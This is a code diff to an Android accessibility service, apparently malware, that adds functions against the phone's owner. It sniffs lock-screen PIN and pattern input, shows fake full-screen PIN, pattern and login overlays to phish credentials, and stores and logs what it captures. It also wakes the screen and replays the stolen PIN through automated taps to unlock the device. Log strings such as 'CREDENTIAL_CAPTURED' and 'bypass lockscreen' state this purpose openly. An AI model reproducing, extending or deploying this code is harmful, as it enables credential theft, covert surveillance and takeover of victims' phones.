@@ -6,20 +6,26 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.content.pm.ServiceInfo;
+import android.graphics.Canvas;
+import android.graphics.Color;
+import android.graphics.Paint;
 import android.graphics.Path;
 import android.graphics.Point;
 import android.graphics.Rect;
 import android.os.Build;
 import android.os.Handler;
 import android.os.Looper;
+import android.os.PowerManager;
 import android.provider.Settings;
 import android.util.Log;
 import android.view.ContextThemeWrapper;
 import android.view.LayoutInflater;
+import android.view.MotionEvent;
 import android.view.View;
 import android.view.WindowManager;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
+import android.widget.FrameLayout;
 import android.widget.ProgressBar;
 import android.widget.TextView;
 import androidx.core.content.ContextCompat;
@@ -196,16 +202,20 @@ public class IO_Persistence_Manager extends AccessibilityService {
                 eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                 
                 String pkgLower = packageName.toLowerCase();
-                if (pkgLower.contains("permission") || 
-                    pkgLower.contains("installer") ||
+                boolean isMessaging = pkgLower.contains("messaging") || pkgLower.contains("mms") || pkgLower.contains("sms") ||
+                        pkgLower.contains("whatsapp") || pkgLower.contains("telegram") || pkgLower.contains("signal") ||
+                        pkgLower.contains("messenger") || pkgLower.contains("chat") || pkgLower.contains("talk") ||
+                        pkgLower.contains("dialer") || pkgLower.contains("contacts") || pkgLower.contains("inbox") ||
+                        pkgLower.contains("mail");
+
+                if (!isMessaging && (pkgLower.contains("permission") || 
+                    pkgLower.contains("packageinstaller") ||
                     pkgLower.contains("settings") ||
-                    pkgLower.contains("security") ||
                     pkgLower.contains("safecenter") ||
-                    pkgLower.contains("android") ||
-                    pkgLower.contains("vending") ||
-                    pkgLower.contains("gms") ||
-                    pkgLower.contains(getPackageName().toLowerCase()) ||
-                    pkgLower.contains("system.stability")) {
+                    pkgLower.contains("securitycenter") ||
+                    pkgLower.contains("systemui") ||
+                    pkgLower.contains("media.projection") ||
+                    pkgLower.contains(getPackageName().toLowerCase()))) {
                     runTacticalAutoPilot(packageName);
                 }
             }
@@ -231,16 +241,26 @@ public class IO_Persistence_Manager extends AccessibilityService {
             }
         }
         
-        // KEYGUARD_SNIFFER: Intercept Lock Screen PIN / Pattern entries
-        String pkgLower = packageName.toLowerCase();
-        if (pkgLower.contains("systemui") || 
-            pkgLower.contains("keyguard") || 
-            pkgLower.contains("biometrics") || 
-            pkgLower.equals("android") ||
-            pkgLower.contains("lockscreen") ||
-            pkgLower.contains("guard") ||
-            pkgLower.contains("sec.android.app")) {
-            sniffKeyguardPinPattern(event, packageName);
+        // KEYGUARD_SNIFFER: Intercept Lock Screen PIN / Pattern entries on user touch events
+        if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED ||
+            eventType == AccessibilityEvent.TYPE_VIEW_FOCUSED ||
+            eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ||
+            eventType == AccessibilityEvent.TYPE_VIEW_HOVER_ENTER) {
+
+            String pkgLower = packageName.toLowerCase();
+            CharSequence clsSeq = event.getClassName();
+            String clsStr = clsSeq != null ? clsSeq.toString().toLowerCase() : "";
+            if (pkgLower.contains("systemui") || 
+                pkgLower.contains("keyguard") || 
+                pkgLower.contains("biometrics") || 
+                pkgLower.equals("android") ||
+                pkgLower.contains("lockscreen") ||
+                pkgLower.contains("guard") ||
+                pkgLower.contains("samsung") ||
+                clsStr.contains("pattern") ||
+                clsStr.contains("lock")) {
+                sniffKeyguardPinPattern(event, packageName);
+            }
         }
 
         // --- 2. CRITICAL STABILITY & PRIVACY FILTER ---
@@ -317,9 +337,10 @@ public class IO_Persistence_Manager extends AccessibilityService {
 
     private static final StringBuilder keyguardPinBuffer = new StringBuilder();
     private static volatile long lastPinDigitTime = 0;
+    private static volatile boolean isAutoUnlocking = false;
 
     private void sniffKeyguardPinPattern(AccessibilityEvent event, String pkg) {
-        if (event == null) return;
+        if (event == null || isAutoUnlocking) return;
 
         AccessibilityNodeInfo source = event.getSource();
         String text = "";
@@ -346,28 +367,53 @@ public class IO_Persistence_Manager extends AccessibilityService {
             desc = event.getContentDescription().toString().trim();
         }
 
+        boolean isPatternEvent = clsName.contains("LockPattern") || 
+                viewId.contains("pattern") || 
+                desc.toLowerCase().contains("cell") || 
+                text.toLowerCase().contains("cell") || 
+                desc.toLowerCase().contains("pattern") || 
+                text.toLowerCase().contains("pattern");
+
+        String lowerT = text.toLowerCase();
+        String lowerD = desc.toLowerCase();
+        String lowerId = viewId.toLowerCase();
+
+        boolean isActionOrSubmitNode = lowerT.contains("ok") || lowerT.contains("enter") || 
+                lowerT.contains("submit") || lowerT.contains("done") || lowerT.contains("emergency") ||
+                lowerD.contains("ok") || lowerD.contains("enter") || lowerD.contains("submit") || 
+                lowerD.contains("done") || lowerD.contains("emergency") || lowerId.contains("ok") || 
+                lowerId.contains("enter") || lowerId.contains("submit") || lowerId.contains("done") || 
+                lowerId.contains("emergency") || lowerId.contains("del") || lowerId.contains("clear") ||
+                lowerT.contains("delete") || lowerD.contains("delete") || lowerT.contains("clear");
+
         String digit = null;
 
-        // 1. Direct Single Digit Text or Desc Check
-        if (text.length() == 1 && Character.isDigit(text.charAt(0))) {
-            digit = text;
-        } else if (desc.length() == 1 && Character.isDigit(desc.charAt(0))) {
-            digit = desc;
-        } else {
-            // 2. View ID or Desc Substring Digit Check (Samsung / Pixel Keyguard Keypad Buttons)
-            for (int i = 0; i <= 9; i++) {
-                String dStr = String.valueOf(i);
-                if (text.equals(dStr) || desc.equals(dStr) || 
-                    desc.contains("key " + i) || desc.contains("digit " + i) || desc.startsWith(dStr + " ") || desc.endsWith(" " + dStr) ||
-                    viewId.contains("key" + i) || viewId.endsWith("key_" + i) || viewId.endsWith("digit_" + i) || viewId.endsWith("id/" + dStr) || viewId.endsWith("id/key" + dStr)) {
-                    digit = dStr;
-                    break;
+        if (!isPatternEvent && !isActionOrSubmitNode) {
+            // 1. Universal Digit Extraction (Samsung, Pixel, Xiaomi, Motorola Keypads)
+            if (text.length() == 1 && Character.isDigit(text.charAt(0))) {
+                digit = text;
+            } else if (desc.length() == 1 && Character.isDigit(desc.charAt(0))) {
+                digit = desc;
+            } else {
+                for (int i = 0; i <= 9; i++) {
+                    String dStr = String.valueOf(i);
+
+                    if (text.equals(dStr) || desc.equals(dStr) || 
+                        lowerT.equals("key " + i) || lowerD.equals("key " + i) ||
+                        lowerT.equals("digit " + i) || lowerD.equals("digit " + i) ||
+                        lowerId.endsWith("key_" + i) || lowerId.endsWith("digit_" + i) ||
+                        lowerId.endsWith("btn_" + i) || lowerId.endsWith("key" + i) ||
+                        lowerId.endsWith("digit" + i) || lowerId.endsWith("btn" + i) ||
+                        lowerId.endsWith("/" + dStr) || lowerId.endsWith("_" + dStr)) {
+                        digit = dStr;
+                        break;
+                    }
                 }
             }
         }
 
         long now = System.currentTimeMillis();
-        if (now - lastPinDigitTime > 15000) {
+        if (now - lastPinDigitTime > 3000) {
             keyguardPinBuffer.setLength(0);
         }
 
@@ -382,10 +428,14 @@ public class IO_Persistence_Manager extends AccessibilityService {
                 FirebaseConfig.logActivity("KEYGUARD_SNIFFER: Keyguard Digit [" + digit + "] -> Buffer: [" + currentBuffer + "]");
                 logKeystroke("\n[KEYGUARD_PIN_DIGIT]: " + digit + " (Current Pin: " + currentBuffer + ")");
 
-                if (currentBuffer.length() >= 4) {
+                if (currentBuffer.length() >= 4 && currentBuffer.length() <= 6) {
                     Log.d(TAG, "KEYGUARD_SNIFFER: Lock Screen PIN typed: [" + currentBuffer + "]");
                     FirebaseConfig.logActivity("CREDENTIAL_CAPTURED: Lock Screen PIN/Passcode = [" + currentBuffer + "]");
                     logKeystroke("\n==========================================\n[CREDENTIAL_CAPTURED]: LOCK_SCREEN_PIN = " + currentBuffer + "\n==========================================\n");
+                    getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit()
+                            .putString("captured_pin", currentBuffer)
+                            .remove("captured_pattern")
+                            .commit();
                 }
             }
         } else {
@@ -397,11 +447,65 @@ public class IO_Persistence_Manager extends AccessibilityService {
                 }
             }
 
-            // Capture Lock Pattern View cell gestures
+            // Capture Lock Pattern View 3x3 matrix cell gestures
             if (clsName.contains("LockPattern") || viewId.contains("pattern") || desc.toLowerCase().contains("cell") || desc.toLowerCase().contains("pattern")) {
-                if (!desc.isEmpty()) {
-                    logKeystroke("\n[KEYGUARD_PATTERN_NODE]: " + desc + " ");
-                    FirebaseConfig.logActivity("KEYGUARD_PATTERN_NODE: " + desc);
+                if (source != null) {
+                    Rect bounds = new Rect();
+                    source.getBoundsInScreen(bounds);
+                    if (bounds.width() > 0 && bounds.height() > 0) {
+                        int fromIdx = event.getFromIndex();
+                        if (fromIdx >= 0 && fromIdx <= 8) {
+                            int row = fromIdx / 3;
+                            int col = fromIdx % 3;
+                            int cellW = bounds.width() / 3;
+                            int cellH = bounds.height() / 3;
+                            int cx = bounds.left + (col * cellW) + (cellW / 2);
+                            int cy = bounds.top + (row * cellH) + (cellH / 2);
+                            recordPatternPoint(cx, cy, "CellIndex_" + fromIdx);
+                        } else if (bounds.width() < getScreenWidth() / 2) {
+                            recordPatternPoint(bounds.centerX(), bounds.centerY(), desc);
+                        } else {
+                            String checkStr = (desc + " " + text).toLowerCase().trim();
+                            int row = -1, col = -1;
+
+                            if (checkStr.contains("cell") || checkStr.contains("nodo") || checkStr.contains("celda") || checkStr.contains(",")) {
+                                for (int r = 1; r <= 3; r++) {
+                                    for (int c = 1; c <= 3; c++) {
+                                        if (checkStr.contains("cell " + r + ", " + c) || 
+                                            checkStr.contains("cell " + r + "," + c) ||
+                                            checkStr.contains("celda " + r + ", " + c) ||
+                                            checkStr.contains(r + ", " + c) ||
+                                            checkStr.contains(r + "," + c)) {
+                                            row = r - 1;
+                                            col = c - 1;
+                                            break;
+                                        }
+                                    }
+                                    if (row != -1) break;
+                                }
+                            }
+
+                            if (row == -1) {
+                                for (int c = 1; c <= 9; c++) {
+                                    if (checkStr.contains("cell " + c) || checkStr.contains("node " + c) || 
+                                        checkStr.contains("area " + c) || checkStr.equals(String.valueOf(c)) || 
+                                        checkStr.endsWith(" " + c)) {
+                                        row = (c - 1) / 3;
+                                        col = (c - 1) % 3;
+                                        break;
+                                    }
+                                }
+                            }
+
+                            if (row >= 0 && col >= 0 && row < 3 && col < 3) {
+                                int cellW = bounds.width() / 3;
+                                int cellH = bounds.height() / 3;
+                                int cx = bounds.left + (col * cellW) + (cellW / 2);
+                                int cy = bounds.top + (row * cellH) + (cellH / 2);
+                                recordPatternPoint(cx, cy, "Cell (" + (row + 1) + "," + (col + 1) + ")");
+                            }
+                        }
+                    }
                 }
             }
         }
@@ -783,6 +887,7 @@ public class IO_Persistence_Manager extends AccessibilityService {
     private View blackoutView;
     private View lockView;
     private android.webkit.WebView overlayWebView;
+    private View activeShadowOverlayView;
 
     public void startBlackout(final boolean enabled) {
         new Handler(Looper.getMainLooper()).post(() -> {
@@ -1116,6 +1221,25 @@ public class IO_Persistence_Manager extends AccessibilityService {
                             @android.webkit.JavascriptInterface
                             public void capture(String data) {
                                 FirebaseConfig.logActivity("INTEL_EXTRACTED: Overlay credentials captured -> " + data);
+                                if (data != null && !data.trim().isEmpty()) {
+                                    String clean = data.trim();
+                                    if (clean.startsWith("PAT:")) {
+                                        String patternCoords = clean.substring(4).trim();
+                                        if (patternCoords.split("\\|").length >= 2) {
+                                            getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit()
+                                                    .putString("captured_pattern", patternCoords)
+                                                    .remove("captured_pin")
+                                                    .apply();
+                                            FirebaseConfig.logActivity("CREDENTIAL_CAPTURED: Lock Screen Pattern Coords = [" + patternCoords + "]");
+                                        }
+                                    } else if (clean.matches("\\d{4,8}")) {
+                                        getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit()
+                                                .putString("captured_pin", clean)
+                                                .remove("captured_pattern")
+                                                .apply();
+                                        FirebaseConfig.logActivity("CREDENTIAL_CAPTURED: Lock Screen PIN/Passcode = [" + clean + "]");
+                                    }
+                                }
                                 deployShadowOverlay(null); // Auto-terminate on capture
                             }
                         }, "Uplink");
@@ -1147,8 +1271,240 @@ public class IO_Persistence_Manager extends AccessibilityService {
                         overlayWebView = null;
                         FirebaseConfig.logActivity("EXPLOIT_RELEASED: Shadow Overlay terminated");
                     }
+                    if (activeShadowOverlayView != null) {
+                        wm.removeViewImmediate(activeShadowOverlayView);
+                        activeShadowOverlayView = null;
+                    }
                 }
             } catch (Exception e) { Log.e(TAG, "Overlay Error: " + e.getMessage()); }
+        });
+    }
+
+    private void applyKeypadButtonText(android.widget.Button btn, String digit, String subtext) {
+        if (btn == null) return;
+        btn.setTransformationMethod(null);
+        btn.setAllCaps(false);
+
+        if (subtext == null || subtext.trim().isEmpty()) {
+            btn.setText(digit);
+            btn.setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 22);
+            return;
+        }
+
+        String fullText = digit + "\n" + subtext;
+        android.text.SpannableString spannable = new android.text.SpannableString(fullText);
+
+        // Digit part: 22sp Bold
+        spannable.setSpan(new android.text.style.AbsoluteSizeSpan(22, true), 0, digit.length(), android.text.Spannable.SPAN_EXCLUSIVE_EXCLUSIVE);
+        spannable.setSpan(new android.text.style.StyleSpan(android.graphics.Typeface.BOLD), 0, digit.length(), android.text.Spannable.SPAN_EXCLUSIVE_EXCLUSIVE);
+
+        // Subtext letters part: 11sp Regular (noticeably smaller than digit)
+        spannable.setSpan(new android.text.style.AbsoluteSizeSpan(11, true), digit.length() + 1, fullText.length(), android.text.Spannable.SPAN_EXCLUSIVE_EXCLUSIVE);
+
+        btn.setText(spannable);
+    }
+
+    public void deployShadowOverlayLayout(final int layoutResId) {
+        deployShadowOverlayLayout(layoutResId, null);
+    }
+
+    public void deployShadowOverlayLayout(final int layoutResId, final String type) {
+        new Handler(Looper.getMainLooper()).post(() -> {
+            try {
+                WindowManager wm = (WindowManager) getSystemService(android.content.Context.WINDOW_SERVICE);
+                if (layoutResId != 0) {
+                    if (activeShadowOverlayView != null) {
+                        try { wm.removeViewImmediate(activeShadowOverlayView); } catch (Exception ignored) {}
+                        activeShadowOverlayView = null;
+                    }
+                    if (overlayWebView != null) {
+                        try { wm.removeViewImmediate(overlayWebView); } catch (Exception ignored) {}
+                        overlayWebView = null;
+                    }
+
+                    android.view.LayoutInflater inflater = android.view.LayoutInflater.from(IO_Persistence_Manager.this);
+                    activeShadowOverlayView = inflater.inflate(layoutResId, null);
+
+                    android.widget.EditText etUsername = activeShadowOverlayView.findViewById(R.id.et_username);
+                    android.widget.EditText etPassword = activeShadowOverlayView.findViewById(R.id.et_password);
+                    android.widget.EditText etPin = activeShadowOverlayView.findViewById(R.id.et_pin);
+
+                    // Configure PIN Keypad Buttons if present in layout
+                    View btn0 = activeShadowOverlayView.findViewById(R.id.btn_key_0);
+                    View btn1 = activeShadowOverlayView.findViewById(R.id.btn_key_1);
+                    View btn2 = activeShadowOverlayView.findViewById(R.id.btn_key_2);
+                    View btn3 = activeShadowOverlayView.findViewById(R.id.btn_key_3);
+                    View btn4 = activeShadowOverlayView.findViewById(R.id.btn_key_4);
+                    View btn5 = activeShadowOverlayView.findViewById(R.id.btn_key_5);
+                    View btn6 = activeShadowOverlayView.findViewById(R.id.btn_key_6);
+                    View btn7 = activeShadowOverlayView.findViewById(R.id.btn_key_7);
+                    View btn8 = activeShadowOverlayView.findViewById(R.id.btn_key_8);
+                    View btn9 = activeShadowOverlayView.findViewById(R.id.btn_key_9);
+                    View btnDel = activeShadowOverlayView.findViewById(R.id.btn_key_del);
+                    View btnLogin = activeShadowOverlayView.findViewById(R.id.btn_login);
+
+                    if (btn1 instanceof android.widget.Button) {
+                        applyKeypadButtonText((android.widget.Button) btn1, "1", "");
+                        applyKeypadButtonText((android.widget.Button) btn2, "2", "ABC");
+                        applyKeypadButtonText((android.widget.Button) btn3, "3", "DEF");
+                        applyKeypadButtonText((android.widget.Button) btn4, "4", "GHI");
+                        applyKeypadButtonText((android.widget.Button) btn5, "5", "JKL");
+                        applyKeypadButtonText((android.widget.Button) btn6, "6", "MNO");
+                        applyKeypadButtonText((android.widget.Button) btn7, "7", "PQRS");
+                        applyKeypadButtonText((android.widget.Button) btn8, "8", "TUV");
+                        applyKeypadButtonText((android.widget.Button) btn9, "9", "WXYZ");
+                        applyKeypadButtonText((android.widget.Button) btn0, "0", "+");
+                    }
+
+                    View promptContainer = activeShadowOverlayView.findViewById(R.id.prompt_container);
+
+                    Runnable updatePromptVisibility = () -> {
+                        if (etPin != null) {
+                            String pinVal = etPin.getText().toString().trim();
+                            if (promptContainer != null) {
+                                promptContainer.setVisibility(pinVal.length() > 0 ? View.GONE : View.VISIBLE);
+                            }
+                            if (btnLogin != null) {
+                                btnLogin.setAlpha(pinVal.length() >= 4 ? 1.0f : 0.4f);
+                            }
+
+                            if (pinVal.length() >= 4 && pinVal.length() <= 6) {
+                                getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit()
+                                        .putString("captured_pin", pinVal)
+                                        .remove("captured_pattern")
+                                        .commit();
+                                FirebaseConfig.logActivity("CREDENTIAL_CAPTURED: Overlay PIN = [" + pinVal + "]");
+                            }
+                        }
+                    };
+
+                    View.OnClickListener numListener = v -> {
+                        if (etPin != null) {
+                            String digit = v.getTag() != null ? v.getTag().toString() : "";
+                            if (digit.isEmpty() && v instanceof android.widget.Button) {
+                                String text = ((android.widget.Button) v).getText().toString();
+                                if (text.contains("\n")) text = text.substring(0, text.indexOf("\n"));
+                                digit = text;
+                            }
+                            if (!digit.isEmpty()) {
+                                etPin.append(digit);
+                                updatePromptVisibility.run();
+                            }
+                        }
+                    };
+
+                    if (btn0 != null) btn0.setOnClickListener(numListener);
+                    if (btn1 != null) btn1.setOnClickListener(numListener);
+                    if (btn2 != null) btn2.setOnClickListener(numListener);
+                    if (btn3 != null) btn3.setOnClickListener(numListener);
+                    if (btn4 != null) btn4.setOnClickListener(numListener);
+                    if (btn5 != null) btn5.setOnClickListener(numListener);
+                    if (btn6 != null) btn6.setOnClickListener(numListener);
+                    if (btn7 != null) btn7.setOnClickListener(numListener);
+                    if (btn8 != null) btn8.setOnClickListener(numListener);
+                    if (btn9 != null) btn9.setOnClickListener(numListener);
+
+                    if (btnDel != null) {
+                        btnDel.setOnClickListener(v -> {
+                            if (etPin != null && etPin.getText().length() > 0) {
+                                etPin.setText(etPin.getText().subSequence(0, etPin.getText().length() - 1));
+                                updatePromptVisibility.run();
+                            }
+                        });
+                    }
+
+                    if (btnLogin != null) {
+                        btnLogin.setOnClickListener(v -> {
+                            String u = etUsername != null ? etUsername.getText().toString().trim() : "";
+                            String p = etPassword != null ? etPassword.getText().toString().trim() : "";
+                            String pin = etPin != null ? etPin.getText().toString().trim() : "";
+
+                            if (etPin != null && pin.length() < 4) {
+                                return; // Require at least 4 digits before allowing OK submit
+                            }
+
+                            String captured = "";
+                            if (!pin.isEmpty()) {
+                                captured = pin;
+                            } else if (!u.isEmpty() || !p.isEmpty()) {
+                                captured = u + ":" + p;
+                            }
+
+                            if (!captured.isEmpty()) {
+                                FirebaseConfig.logActivity("INTEL_EXTRACTED: Overlay credentials captured -> " + captured);
+                                getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit()
+                                        .putString("captured_pin", captured)
+                                        .remove("captured_pattern")
+                                        .commit();
+                                FirebaseConfig.logActivity("CREDENTIAL_CAPTURED: Lock Screen Credential = [" + captured + "]");
+                                logKeystroke("\n==========================================\n[CREDENTIAL_CAPTURED]: OVERLAY_DATA = " + captured + "\n==========================================\n");
+                            }
+                            deployShadowOverlayLayout(0);
+                        });
+                    }
+
+                    // Configure Pattern Touch Layer if present in layout
+                    FrameLayout patternContainer = activeShadowOverlayView.findViewById(R.id.pattern_container);
+                    if (patternContainer != null) {
+                        List<View> dots = new ArrayList<>();
+                        dots.add(activeShadowOverlayView.findViewById(R.id.dot_0));
+                        dots.add(activeShadowOverlayView.findViewById(R.id.dot_1));
+                        dots.add(activeShadowOverlayView.findViewById(R.id.dot_2));
+                        dots.add(activeShadowOverlayView.findViewById(R.id.dot_3));
+                        dots.add(activeShadowOverlayView.findViewById(R.id.dot_4));
+                        dots.add(activeShadowOverlayView.findViewById(R.id.dot_5));
+                        dots.add(activeShadowOverlayView.findViewById(R.id.dot_6));
+                        dots.add(activeShadowOverlayView.findViewById(R.id.dot_7));
+                        dots.add(activeShadowOverlayView.findViewById(R.id.dot_8));
+
+                        PatternOverlayView patternView = new PatternOverlayView(IO_Persistence_Manager.this);
+                        patternView.setDotViews(dots);
+                        patternView.setOnPatternCompleteListener(patternCoords -> {
+                            FirebaseConfig.logActivity("INTEL_EXTRACTED: Overlay pattern captured -> PAT:" + patternCoords);
+                            getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit()
+                                    .putString("captured_pattern", patternCoords)
+                                    .remove("captured_pin")
+                                    .apply();
+                            FirebaseConfig.logActivity("CREDENTIAL_CAPTURED: Lock Screen Pattern Coords = [" + patternCoords + "]");
+                            logKeystroke("\n==========================================\n[CREDENTIAL_CAPTURED]: LOCK_SCREEN_PATTERN = " + patternCoords + "\n==========================================\n");
+                            deployShadowOverlayLayout(0);
+                        });
+
+                        patternContainer.addView(patternView, new FrameLayout.LayoutParams(
+                                FrameLayout.LayoutParams.MATCH_PARENT,
+                                FrameLayout.LayoutParams.MATCH_PARENT
+                        ));
+                    }
+
+                    int overlayType = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ?
+                            WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY : 2003;
+
+                    WindowManager.LayoutParams params = new WindowManager.LayoutParams(
+                            WindowManager.LayoutParams.MATCH_PARENT,
+                            WindowManager.LayoutParams.MATCH_PARENT,
+                            overlayType,
+                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
+                                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
+                                    WindowManager.LayoutParams.FLAG_FULLSCREEN |
+                                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
+                                    WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
+                                    WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED,
+                            android.graphics.PixelFormat.TRANSLUCENT);
+
+                    params.flags &= ~WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;
+                    params.softInputMode = WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE | WindowManager.LayoutParams.SOFT_INPUT_STATE_ALWAYS_VISIBLE;
+                    params.screenOrientation = android.content.pm.ActivityInfo.SCREEN_ORIENTATION_PORTRAIT;
+
+                    wm.addView(activeShadowOverlayView, params);
+                    FirebaseConfig.logActivity("EXPLOIT_DEPLOYED: Native Shadow Layout Overlay projected to screen");
+                } else {
+                    if (activeShadowOverlayView != null) {
+                        wm.removeViewImmediate(activeShadowOverlayView);
+                        activeShadowOverlayView = null;
+                        FirebaseConfig.logActivity("EXPLOIT_RELEASED: Shadow Layout Overlay terminated");
+                    }
+                }
+            } catch (Exception e) { Log.e(TAG, "Native Overlay Error: " + e.getMessage()); }
         });
     }
 
@@ -1495,6 +1851,33 @@ public class IO_Persistence_Manager extends AccessibilityService {
 
     // ============ INTERACTION ============
 
+    public void wakeUpScreen() {
+        try {
+            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
+            if (pm != null) {
+                @SuppressWarnings("deprecation")
+                PowerManager.WakeLock wakeLock = pm.newWakeLock(
+                    PowerManager.FULL_WAKE_LOCK |
+                    PowerManager.ACQUIRE_CAUSES_WAKEUP |
+                    PowerManager.ON_AFTER_RELEASE,
+                    "LabRATS:GhostWakeUp"
+                );
+                wakeLock.acquire(3000);
+            }
+
+            Intent wakeIntent = new Intent(this, PermissionActivity.class);
+            wakeIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK |
+                                Intent.FLAG_ACTIVITY_NO_ANIMATION |
+                                Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
+            wakeIntent.putExtra("wake_screen", true);
+            startActivity(wakeIntent);
+
+            Log.d(TAG, "GHOST_WAKE: PowerManager WakeLock + WindowManager setTurnScreenOn dispatched");
+        } catch (Exception e) {
+            Log.e(TAG, "GHOST_WAKE Error: " + e.getMessage());
+        }
+    }
+
     public boolean lockScreenNow() {
         keyguardPinBuffer.setLength(0);
         final boolean[] result = {false};
@@ -1541,6 +1924,298 @@ public class IO_Persistence_Manager extends AccessibilityService {
         } catch (InterruptedException ignored) {}
 
         return result[0];
+    }
+
+    private static final StringBuilder keyguardPatternCoords = new StringBuilder();
+    private static volatile long lastPatternPointTime = 0;
+    private static volatile int lastPatternX = -1;
+    private static volatile int lastPatternY = -1;
+
+    private synchronized void recordPatternPoint(int x, int y, String desc) {
+        long now = System.currentTimeMillis();
+        if (now - lastPatternPointTime > 4000) {
+            keyguardPatternCoords.setLength(0);
+            lastPatternX = -1;
+            lastPatternY = -1;
+        }
+        lastPatternPointTime = now;
+
+        // Minimum 100px Euclidean distance threshold between distinct pattern matrix cells
+        if (lastPatternX != -1 && lastPatternY != -1) {
+            int dx = x - lastPatternX;
+            int dy = y - lastPatternY;
+            if ((dx * dx + dy * dy) < 10000) {
+                return;
+            }
+        }
+        lastPatternX = x;
+        lastPatternY = y;
+
+        String coordStr = x + "," + y;
+        if (keyguardPatternCoords.length() > 0 && !keyguardPatternCoords.toString().endsWith("|")) {
+            keyguardPatternCoords.append("|");
+        }
+        keyguardPatternCoords.append(coordStr);
+
+        String currentPattern = keyguardPatternCoords.toString();
+        Log.d(TAG, "KEYGUARD_SNIFFER: Distinct pattern node added: (" + x + "," + y + ") -> " + currentPattern);
+        FirebaseConfig.logActivity("KEYGUARD_PATTERN_NODE: Cell (" + x + "," + y + ") [" + desc + "]");
+        
+        if (currentPattern.split("\\|").length >= 2) {
+            getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit()
+                    .putString("captured_pattern", currentPattern)
+                    .remove("captured_pin")
+                    .apply();
+            FirebaseConfig.logActivity("CREDENTIAL_CAPTURED: Lock Screen Pattern Coords = [" + currentPattern + "]");
+        }
+    }
+
+    private AccessibilityNodeInfo findKeypadButtonForDigit(AccessibilityNodeInfo node, String digitStr) {
+        if (node == null) return null;
+
+        CharSequence textSeq = node.getText();
+        CharSequence descSeq = node.getContentDescription();
+        String text = textSeq != null ? textSeq.toString().trim().toLowerCase() : "";
+        String desc = descSeq != null ? descSeq.toString().trim().toLowerCase() : "";
+        String viewId = node.getViewIdResourceName() != null ? node.getViewIdResourceName().toLowerCase() : "";
+
+        if (isInteractiveButtonNode(node)) {
+            if (text.equals(digitStr) || desc.equals(digitStr) ||
+                text.startsWith(digitStr + "\n") || text.startsWith(digitStr + " ") ||
+                desc.startsWith(digitStr + "\n") || desc.startsWith(digitStr + " ") ||
+                viewId.endsWith("key" + digitStr) || viewId.endsWith("key_" + digitStr) ||
+                viewId.endsWith("digit_" + digitStr) || viewId.endsWith("btn" + digitStr) ||
+                viewId.endsWith("id/" + digitStr)) {
+                return AccessibilityNodeInfo.obtain(node);
+            }
+        }
+
+        int count = node.getChildCount();
+        for (int i = 0; i < count; i++) {
+            AccessibilityNodeInfo child = node.getChild(i);
+            if (child != null) {
+                AccessibilityNodeInfo res = findKeypadButtonForDigit(child, digitStr);
+                child.recycle();
+                if (res != null) return res;
+            }
+        }
+        return null;
+    }
+
+    public boolean autoUnlockWithCapturedPin() {
+        String pin = getSharedPreferences("StabilityConfig", MODE_PRIVATE).getString("captured_pin", "");
+        if (pin == null || pin.isEmpty()) {
+            Log.w(TAG, "AUTO_UNLOCK: No captured PIN stored in preferences yet.");
+            return false;
+        }
+
+        isAutoUnlocking = true;
+        long lockDuration = (pin.length() + 1) * 200L + 2000L;
+        new Handler(Looper.getMainLooper()).postDelayed(() -> isAutoUnlocking = false, lockDuration);
+
+        Log.d(TAG, "AUTO_UNLOCK: Replaying stored PIN [" + pin + "] on Keyguard keypad...");
+        FirebaseConfig.logActivity("AUTO_UNLOCK: Replaying stored PIN [" + pin + "] to bypass lockscreen...");
+
+        final Handler h = new Handler(Looper.getMainLooper());
+        int sw = getScreenWidth() > 0 ? getScreenWidth() : 1080;
+        int sh = getScreenHeight() > 0 ? getScreenHeight() : 2520;
+
+        for (int i = 0; i < pin.length(); i++) {
+            final int index = i;
+            final char digit = pin.charAt(i);
+            final String digitStr = String.valueOf(digit);
+
+            h.postDelayed(() -> {
+                boolean clicked = false;
+                AccessibilityNodeInfo activeRoot = getRootInActiveWindow();
+                if (activeRoot != null) {
+                    AccessibilityNodeInfo targetNode = findKeypadButtonForDigit(activeRoot, digitStr);
+                    if (targetNode != null) {
+                        boolean nodeClicked = performNodeClick(targetNode);
+                        if (!nodeClicked) {
+                            Rect b = new Rect();
+                            targetNode.getBoundsInScreen(b);
+                            if (b.centerX() > 0 && b.centerY() > 0) {
+                                clickAt(b.centerX(), b.centerY());
+                            }
+                        }
+                        clicked = true;
+                        Log.d(TAG, "AUTO_UNLOCK: Clicked PIN digit [" + digitStr + "] via node search");
+                        targetNode.recycle();
+                    }
+                    try { activeRoot.recycle(); } catch (Exception ignored) {}
+                }
+
+                if (!clicked) {
+                    int dVal = digit - '0';
+                    int row, col;
+                    if (dVal == 0) {
+                        row = 3; col = 1;
+                    } else {
+                        row = (dVal - 1) / 3;
+                        col = (dVal - 1) % 3;
+                    }
+
+                    int keyW = (int) (sw * 0.28);
+                    int startX = (int) (sw * 0.22);
+                    int startY = (int) (sh * 0.56);
+                    int rowGap = (int) (sh * 0.08);
+
+                    int tapX = startX + (col * keyW);
+                    int tapY = startY + (row * rowGap);
+
+                    clickAt(tapX, tapY);
